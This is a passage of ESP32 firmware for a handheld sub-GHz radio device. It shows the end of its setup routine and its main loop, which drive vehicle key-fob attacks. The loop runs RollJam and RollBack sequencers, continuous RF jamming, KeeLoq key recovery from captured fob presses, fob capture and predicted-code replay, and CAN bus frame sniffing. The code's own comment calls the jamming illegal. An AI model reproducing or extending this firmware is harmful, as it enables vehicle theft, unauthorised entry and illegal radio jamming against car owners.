    serialRxQueueActual=(uint32_t)got; }
  Serial.begin(115200);
  delay(400); // let USB-CDC enumerate before first Serial.println

  // ── Reset-path jam guard — MUST be the first hardware action ──────────────
  // A reset (watchdog, brownout, panic, reflash) does not run any cleanup path, so
  // a jam that was active when the CPU died can outlive it. That failure is both
  // silent and illegal, so it is defended deterministically here rather than by
  // assert on the error paths alone (research/09 §2.2).
  //
  // The mechanism: startJam() leaves the CC1101 in TX (STX) and drives GDO0 HIGH.
  // In async TX GDO0 is the TX DATA input, so a held-high input means a continuous
  // carrier. The hazard window is real — the previous ordering switched GDO0 to
  // INPUT (floating, indeterminate) at setup+~1.6 kB, while cc_init()/SRES — which
  // actually takes the radio out of TX — did not run until setup+~5.4 kB, after
  // WiFi.softAP, DNS, BLE, HTTP and NVS work.
  //
  // Two things are needed, in this order, before anything else can fail:
  //   1. drive GDO0 LOW as an OUTPUT, so the TX data input is a definite no-carrier
  //      level rather than a floating pin. This alone stops the carrier even with
  //      the radio still in STX.
  //   2. reset the radio out of TX as soon as SPI exists (cc_init does SRES).
  // Step 1 is done first because it needs no SPI and no clock setup.
  pinMode(PIN_GDO0,OUTPUT);
  digitalWrite(PIN_GDO0,LOW);
  jamActive=false; jamFreq=0.0f;   // no jam can be inherited across a reset
  rbReset();                       // ditto for the RollBack sequencer state

  ks_klSelfTest();      // F2: verify the cipher against 3 published vectors
  ks_klParseSelfTest(); // verify 66-bit framing, incl. hops with the top bits set
  ks_klDerivSelfTest(); // V2: verify the 14 derivations agree with the match predicate
  ks_kiaV34SelfTest();  // A1: Kia V3/V4 synthetic round-trip (no radio)
  if(!klSelfTestOK) Serial.println("[KL] WARNING: cipher self-test failed — /api/status kl_selftest=false");
  if(!klParseOK)    Serial.println("[KL] WARNING: frame parser self-test failed — decodes are untrustworthy");
  if(!klDerivOK)    Serial.println("[KL] WARNING: derivation self-test failed — key recovery is unreliable");
  if(!kiaV34SelfTestOK) Serial.println("[KIA] WARNING: V3/V4 synthetic round-trip failed — the decoder framing is broken");

  deviceCredentialsReady=loadOrCreateDeviceCredentials();
  if(!deviceCredentialsReady){
    Serial.println("[SECURITY] Credential storage failed; WiFi control surface disabled");
  } else {
    printDeviceCredentialsToSerial();
  }

  // ── 3.3 V sensor rail (powers RGB level-shifter) ─────────────────────────
  pinMode(PIN_SENSOR_CE,OUTPUT); digitalWrite(PIN_SENSOR_CE,HIGH); delay(50);

  // ── Park the LoRa module ─────────────────────────────────────────────────
  // This rail also powers the SX1278, so raising it here brings LoRa up. Nothing on the
  // normal boot path put it to sleep afterwards: the only loraHardReset() calls are inside
  // captureSignal(), so between boot and the first capture the module sat powered and
  // awake, contributing noise to the shared front end.
  //
  // Measured effect: the capture noise floor read -101/-102 dBm with LoRa awake and
  // -112 dBm once parked, and at 700 MHz -- a band nothing consumer uses -- the card fired
  // captures with NOTHING transmitting, 3 of 3, before the park and 0 of 3 after. The
  // trigger is floor+10, so those 11 dB moved it from -91 to -102 and the module's own
  // noise stopped crossing it. See loraParkReset() for the mechanism and the vendor's note.
  loraParkReset();

  // ── Button + CS pins ──────────────────────────────────────────────────────
  pinMode(PIN_BTN,INPUT_PULLUP);
  pinMode(PIN_CC1101_CS,OUTPUT); digitalWrite(PIN_CC1101_CS,HIGH);
  pinMode(PIN_LORA_CS,OUTPUT);   digitalWrite(PIN_LORA_CS,HIGH);
  pinMode(PIN_SD_CS,OUTPUT);     digitalWrite(PIN_SD_CS,HIGH);
  pinMode(PIN_GDO0,INPUT);

  // ── WiFi AP — MUST come before SPI/CC1101 ────────────────────────────────
  // WiFi TX burst draws a large transient current that glitches the 3.3V rail
  // and can corrupt CC1101 register writes.  Starting WiFi first lets the
  // supply settle before any SPI communication.
  //
  // setSleep(false) disables modem-sleep so beacon frames are sent every DTIM
  // interval — without it the AP disappears from the scan list on most phones.
  WiFi.persistent(false);       // don't write credentials to NVS
  WiFi.setSleep(false);         // keep radio on between beacons (Arduino layer)
  WiFi.mode(WIFI_AP);
  delay(100);                   // wait for driver to settle
  IPAddress apIP(192,168,4,1), apGW(192,168,4,1), apSub(255,255,255,0);
  WiFi.softAPConfig(apIP, apGW, apSub); // set IP before softAP() so DHCP starts ready
  if(deviceCredentialsReady)
    WiFi.softAP(AP_SSID, deviceApPassword.c_str(), 6, 0, 4); // ch6, not hidden, max 4 clients
  // ── iPhone AP stability fixes ─────────────────────────────────────────────
  // (1) Kill modem-sleep at ESP-IDF level — WiFi.setSleep(false) only reaches
  //     the Arduino wrapper; esp_wifi_set_ps reaches the actual driver.
  esp_wifi_set_ps(WIFI_PS_NONE);
  // (2) Force 20 MHz bandwidth. iPhones disconnect frequently when the ESP32
  //     auto-negotiates HT40 (40 MHz) — a known ESP32 SoftAP interop bug.
  esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW_HT20);
  // (3) Extend station inactive timeout from default 5 s to 60 s.  iPhone
  //     Safari stops sending null-data frames for 10–20 s mid-browse; the
  //     default 5 s timeout drops the connection before the page finishes.
  esp_wifi_set_inactive_time(WIFI_IF_AP, 60);
  delay(200);                   // let TX burst settle before touching SPI bus
  if(deviceCredentialsReady)
    addLog("[WiFi] AP: "+String(AP_SSID)+" @ "+WiFi.softAPIP().toString());

  // ── DNS captive portal — redirect all hostnames to 192.168.4.1 ───────────
  // When a phone connects, the OS probes a captive-portal URL; the DNS server
  // answers every query with 192.168.4.1 so the browser opens our dashboard.
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", apIP);
  addLog("[DNS] Captive portal started");

  // ── BLE scanner (ESP32-S3 built-in BLE, coexists with WiFi AP) ───────────
  BLEDevice::init("SGP Card Mini");
  bleInited=true;
  addLog("[BLE] Scanner ready");

  // ── HTTP server ───────────────────────────────────────────────────────────
  setupRoutes();
  srv.begin();
  addLog("[HTTP] http://"+WiFi.softAPIP().toString());

  // ── WebSocket transport (port 81) ─────────────────────────────────────────
  // The WiFi dashboard connects here; the USB dashboard uses serial. Both feed the same
  // dispatcher, and serialEmit() mirrors every event to connected WS clients.
  wsStart();

  // ── RGB LED (sensor rail must be HIGH first — done above) ─────────────────
  rgb.begin(); rgb.setBrightness(80);
  setLed(0,0,255);

  // ── I2C — battery gauge ───────────────────────────────────────────────────
  Wire.begin(8,9);
  readBatt();

  // ── User manufacturer keys (NVS-backed) ───────────────────────────────────
  ks_loadUserKeys();

  // ── Sweep range (NVS-backed) — restore last band before WiFi/serial start ──
  swp_load();
  if(sweepMin>0.0f||sweepMax<9999.0f)
    addLog("[NVS] Sweep restored: "+String(sweepMin,1)+"–"+String(sweepMax,1)+" MHz");

  // ── Headless-scan library + freq preset (NVS-backed) ─────────────────────
  // Restore saved freq preset index, then re-emit any signals that were
  // captured in standalone mode since the last dashboard session.
  {
    hsPrefs.begin("hslib", true);
    uint8_t saved = hsPrefs.getUChar("preset", 2);
    hsPrefs.end();
    if(saved < N_PRESETS) freqPresetIdx = saved;
  }
  hsLib_emitAll();

  // ── SPI bus ───────────────────────────────────────────────────────────────
  SPI.begin(PIN_SCK,PIN_MISO,PIN_MOSI,-1);
  delay(50); // let GPIO-matrix routing settle before first SPI transaction

  bool ok = false;
  for(int _att=1;_att<=3&&!ok;_att++){
    ok=cc_init(433.92);
    if(!ok){ addLog("[CC1101] attempt "+String(_att)+" failed, retrying…"); delay(50*_att); }
  }
  addLog(ok?"[CC1101] OK":"[CC1101] FAIL — check SPI wiring (3 attempts)");
  setLed(ok?0:255,ok?255:0,0);

  // ── SD card — multi-attempt init ─────────────────────────────────────────
  // SD SPI mode requires >74 dummy clocks with CS HIGH before the first CMD
  // command, plus a multi-speed retry loop in case the card is slow to wake.
  {
    bool sdOK=false;
    // 1. Pull all other CS lines HIGH so they don't interfere
    digitalWrite(PIN_CC1101_CS,HIGH); digitalWrite(PIN_LORA_CS,HIGH);
    // 2. Send 128 dummy clocks (16 bytes × 8 bits) with CS HIGH
    digitalWrite(PIN_SD_CS,HIGH);
    SPI.beginTransaction(SPISettings(400000,MSBFIRST,SPI_MODE0));
    for(int i=0;i<16;i++) SPI.transfer(0xFF);
    SPI.endTransaction(); delay(10);
    // 3. Try mounting at decreasing SPI speeds (some cards need a slow start)
    uint32_t speeds[]={4000000,2000000,1000000,400000};
    for(int a=0;a<4&&!sdOK;a++){
      digitalWrite(PIN_CC1101_CS,HIGH); digitalWrite(PIN_LORA_CS,HIGH);
      if(SD.begin(PIN_SD_CS,SPI,speeds[a])){
        if(SD.cardType()!=CARD_NONE){
          sdOK=true;
          addLog("[SD] OK @ "+String(speeds[a]/1000)+" kHz — "+String((uint32_t)(SD.cardSize()/(1024*1024)))+" MB");
        } else { SD.end(); delay(50); }
      } else {
        SD.end(); delay(100);
        // Re-bus + re-dummy between attempts
        SPI.end(); delay(20); SPI.begin(PIN_SCK,PIN_MISO,PIN_MOSI,-1); delay(10);
        digitalWrite(PIN_SD_CS,HIGH);
        SPI.beginTransaction(SPISettings(400000,MSBFIRST,SPI_MODE0));
        for(int i=0;i<16;i++) SPI.transfer(0xFF);
        SPI.endTransaction(); delay(10);
      }
    }
    sdMounted=sdOK;
    if(!sdOK) addLog("[SD] No card (checked 4 speeds)");
  }

  // ── Scanner freq stats ────────────────────────────────────────────────────
  initFreqStats();

  // ── Ready ──────────────────────────────────────────────────────────────────
  setLed(0,150,65);
  beep(2200,80); delay(50); beep(2800,100);
  // Why the last reset happened. This is the missing piece for the import crash: the panic
  // output goes out before any host read window opens, so a reboot and a dropped command are
  // indistinguishable from the host side. esp_reset_reason() distinguishes them, and it
  // survives the reboot.
  {
    esp_reset_reason_t rr=esp_reset_reason();
    const char* rs="unknown";
    switch(rr){
      case ESP_RST_POWERON:   rs="poweron"; break;
      case ESP_RST_EXT:       rs="external"; break;
      case ESP_RST_SW:        rs="software"; break;
      case ESP_RST_PANIC:     rs="PANIC"; break;      // <- a crash lands here
      case ESP_RST_INT_WDT:   rs="int_wdt"; break;
      case ESP_RST_TASK_WDT:  rs="task_wdt"; break;
      case ESP_RST_WDT:       rs="wdt"; break;
      case ESP_RST_DEEPSLEEP: rs="deepsleep"; break;
      case ESP_RST_BROWNOUT:  rs="BROWNOUT"; break;
      case ESP_RST_SDIO:      rs="sdio"; break;
      default: break;
    }
    resetReasonStr=String(rs);
    addLog(String("[SYS] last reset: ")+rs+" ("+String((int)rr)+")");
  }
  addLog("[SYS] serial RX queue: "+String(serialRxQueueActual)+" B (requested "+String(SERIAL_CMD_MAX)+")");
  addLog("[SYS] "+String(FW_VER)+" ready — http://192.168.4.1");
  serialEmit("{\"event\":\"boot\",\"fw\":\""+String(FW_VER)+"\",\"cc1101\":"+String(cc1101OK?"true":"false")+
    ",\"freq\":"+String(curFreq,2)+",\"batt_pct\":"+String(battPct,1)+"}");
}

// ─── Loop ─────────────────────────────────────────────────────────────────────
void loop(){
  // Sample the stack high-water mark first, so the running minimum is captured regardless of
  // which path ran deepest and regardless of when /api/status is later queried (research/29 §3).
  stackSample();
  dnsServer.processNextRequest();
  srv.handleClient();
  handleSerial();
  wsPump();          // run any commands the WebSocket handler queued (WiFi transport)
  ks_krTick(millis());
  rbTick();          // C2 RollBack sequencer (non-blocking, transmits code 2 after the gap)
  jamTick();         // continuous jam: tops up the TX FIFO when GDO0 is unavailable
  rjTick();          // C1 RollJam sequencer (non-blocking, owns the jam)
  checkButton();

  // Key-recovery auto-drive: when a recovery session is active and still
  // needs frames, automatically queue one non-blocking capture per press.
  // This avoids relying on the scan-sweep's ~2.6% per-tick hit probability
  // and instead gives the user a 12-second window for each press.
  // captureResultReady is suppressed so the WiFi dashboard doesn't pop up.
  if(KR.active && KR.got < KR.need && !captureInProgress && !captureRequested){
    capTimeoutOverride = 12000;
    captureRequested   = true;
    captureResultReady = false;
    addLog("[KR] Waiting for press "+String(KR.got+1)+"/"+String(KR.need)
           +" — hold fob near antenna");
  }

  // Non-blocking WiFi capture: run from main loop so srv.handleClient() is
  // never called re-entrantly inside the capture handler.
  if(captureRequested && !captureInProgress && !jamActive){
    captureRequested=false; captureInProgress=true;
    scanActive=false;
    bool ok=captureSignal(capTimeoutOverride);
    if(ok){
      // Snapshot KR state before decode so we can detect non-KeeLoq captures.
      uint8_t krGotBefore=KR.got; bool krWasActive=KR.active;
      decodeSignal();
      markDecodeKept(lastDecode);
      // Non-KeeLoq gate: if recovery was active and ks_krPush was NOT called
      // (KR.got unchanged), the captured protocol is not KeeLoq. Tell the user
      // and stop the session so the auto-drive doesn't keep looping.
      bool krStopped=false;
      if(krWasActive && KR.active && KR.got==krGotBefore){
        String nkProto="unknown";
        int pi=lastDecode.indexOf("\"proto\":\"");
        if(pi>=0){int ps=pi+9;int pe=lastDecode.indexOf("\"",ps);if(pe>ps) nkProto=lastDecode.substring(ps,pe);}
        if(nkProto!="OOK-raw"&&nkProto!="unknown"){
          KR.active=false; KR.got=0; setLed(0,150,65); krStopped=true;
          serialEmit("{\"event\":\"key_recover_not_keeloq\",\"proto\":\""+nkProto
                     +"\",\"hint\":\"Key recovery only works on KeeLoq (HCS-series) fobs. "
                     "Your fob uses "+nkProto+". Use Replay Predicted to retransmit it.\"}");
        }
      }
      String firstDecode=lastDecode;
      // Second capture: 3-second window for user to press fob again.
      // Two frames from the same device populate history → delta becomes exact.
      // Skip if KR was stopped (non-KeeLoq) to give instant feedback.
      if(!krStopped){
        addLog("[CAP2] Press fob again for accurate delta (3s)…");
        if(captureSignal(3000)){
          decodeSignal(); // second decode; history now has both → delta accurate
          markDecodeKept(lastDecode);
        } else {
          lastDecode=firstDecode; // keep first if second press missed
        }
      }
    } else {
      lastDecode="{\"error\":\"capture-failed\",\"edges\":0}";
    }
    captureInProgress=false;
    // During active key recovery the WiFi dashboard result popup is suppressed
    // to avoid noise; recovery progress comes via key_recover_progress events.
    if(!KR.active || KR.got >= KR.need) captureResultReady=true;
    // Respect explicit user pause: only resume if the user hasn't manually stopped the scan.
    if(!scanUserPaused) scanActive=true;
    serialEmit(lastDecode); // also send to USB serial companion
  }

  scanTick();

  // CAN / TWAI frame drain — up to 10 frames per loop tick, zero-timeout (non-blocking).
  // Frames accumulate in the ring buffer; /api/can_frames reads them out over WiFi.
  if(canActive){
    twai_message_t msg;
    for(int _ci=0;_ci<10;_ci++){
      if(twai_receive(&msg,0)!=ESP_OK) break;
      CanFrame& fr=canBuf[canBufHead];
      snprintf(fr.id,12,"%X",msg.identifier);
      fr.ext=(msg.flags&TWAI_MSG_FLAG_EXTD)!=0;
      fr.rtr=(msg.flags&TWAI_MSG_FLAG_RTR)!=0;
      fr.dlc=(uint8_t)min((int)msg.data_length_code,8);
      fr.ts=(uint32_t)millis();
      fr.data[0]='\0';
      for(int _b=0;_b<fr.dlc;_b++){
        char h[4]; snprintf(h,4,_b?" %02X":"%02X",(uint8_t)msg.data[_b]);
        strncat(fr.data,h,sizeof(fr.data)-strlen(fr.data)-1);
      }
      canBufHead=(canBufHead+1)%CAN_BUF_SZ;
      if(canBufCount<CAN_BUF_SZ) canBufCount++;
      canFrameTotal++;
    }
  }

  // FOBclone headless: mode-dependent LED animation
  //   HFC_SCANNING  → blue breathing      (looking for a fob)
  //   HFC_NEEDS_MORE → amber rapid blink  (got 1st capture, need 2nd)
  //   HFC_READY      → green rapid flash  (delta known — tap to replay)
  // A kept decode holds the pixel white for a moment, then the breathe resumes.
  if(decodeFlashUntil && (long)(millis()-decodeFlashUntil)<0){
    setLed(255,255,255);
  } else if(hfcActive){
    static unsigned long hfcLedMs  = 0;
    static uint8_t       hfcLedBr  = 0;
    static int8_t        hfcLedDir = 4;
    unsigned long hfcNow = millis();
    if(hfcState == HFC_SCANNING){
      if(hfcNow - hfcLedMs > 30){
        hfcLedMs = hfcNow;
        if(hfcLedBr == 0   && hfcLedDir < 0) hfcLedDir = 4;
        if(hfcLedBr >= 180 && hfcLedDir > 0) hfcLedDir = -4;
        hfcLedBr += hfcLedDir;
        setLed(0, (uint8_t)(hfcLedBr / 8), hfcLedBr);  // blue breathe
      }
    } else if(hfcState == HFC_NEEDS_MORE){
      // Amber double-blink at ~3 Hz — "almost there, press fob again"
      if(hfcNow - hfcLedMs > 160){
        hfcLedMs = hfcNow;
        hfcLedBr = (hfcLedBr == 0) ? 210 : 0;
        setLed(hfcLedBr, (uint8_t)(hfcLedBr / 2), 0);  // amber blink
      }
    } else {
      // HFC_READY: green flash at ~4 Hz — "tap the button to replay!"
      if(hfcNow - hfcLedMs > 120){
        hfcLedMs = hfcNow;
        hfcLedBr = (hfcLedBr == 0) ? 180 : 0;
        setLed(0, hfcLedBr, (uint8_t)(hfcLedBr / 6));  // green flash
      }
    }
  }
  // FOBscan headless: breathe LED orange so the user knows captures are being saved
  else if(headlessActive){
    static unsigned long hsLedMs  = 0;
    static uint8_t       hsLedBr  = 0;
    static int8_t        hsLedDir = 5;
    if(millis() - hsLedMs > 30){
      hsLedMs = millis();
      if(hsLedBr == 0 && hsLedDir < 0)  hsLedDir = 5;
      if(hsLedBr >= 200 && hsLedDir > 0) hsLedDir = -5;
      hsLedBr += hsLedDir;
      setLed(hsLedBr, (uint8_t)(hsLedBr / 3), 0);   // orange breathe
    }
  }

  static unsigned long lastBatt=0, lastHb=0;
  // Battery update every 30s
  if(millis()-lastBatt>30000){ readBatt(); lastBatt=millis(); }
  // Heartbeat: send live device status to USB host every 5s
  if(millis()-lastHb>5000){
    int ku=0; for(int i=0;i<MAX_KEYS;i++) if(keys[i].used) ku++;
    serialEmit("{\"event\":\"heartbeat\",\"freq\":"+String(curFreq,2)+
      ",\"batt_pct\":"+String(battPct,1)+
      ",\"scan\":"+String(scanActive?"true":"false")+
      ",\"cc1101\":"+String(cc1101OK?"true":"false")+
      ",\"fsk_mode\":"+String(fskCapMode?"true":"false")+
      ",\"sweep_min\":"+String(sweepMin,2)+
      ",\"sweep_max\":"+String(sweepMax,2)+
      ",\"cap_range_min\":"+String(capRangeMin,2)+
      ",\"cap_range_max\":"+String(capRangeMax,2)+
      ",\"sticky_mhz\":"+String(stickyFreq,2)+
      ",\"sticky_prio\":"+String(stickyPrio)+
      ",\"keys\":"+String(ku)+
      ",\"ch_b_ready\":"+String(rfLenB>0?"true":"false")+
      ",\"ch_b_mhz\":"+String(rfFreqB,2)+
      ",\"headless\":"+String(headlessActive?"true":"false")+
      ",\"hfc_active\":"+String(hfcActive?"true":"false")+
      ",\"hfc_state\":"+String(hfcState)+
      ",\"freq_preset\":"+String(freqPresetIdx)+
      ",\"freq_preset_name\":\""+String(FREQ_PRESETS[freqPresetIdx].name)+
      "\",\"uptime\":"+String(millis())+"}");
    lastHb=millis();
  }

  yield();
}
